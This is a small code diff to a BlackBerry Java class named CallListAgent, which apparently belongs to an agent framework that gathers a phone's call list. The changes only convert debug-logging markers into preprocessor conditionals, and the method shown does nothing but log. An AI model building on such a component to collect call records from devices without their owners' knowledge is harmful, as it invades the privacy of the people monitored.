@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -15,8 +16,9 @@ import blackberry.utils.DebugLevel;
  * The Class CallListAgent.
  */
 public final class CallListAgent extends Agent {
-    //#debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
+    //#endif
 
     /**
      * Instantiates a new call list agent.
@@ -47,8 +49,9 @@ public final class CallListAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("run");
+        //#endif
 
     }
 
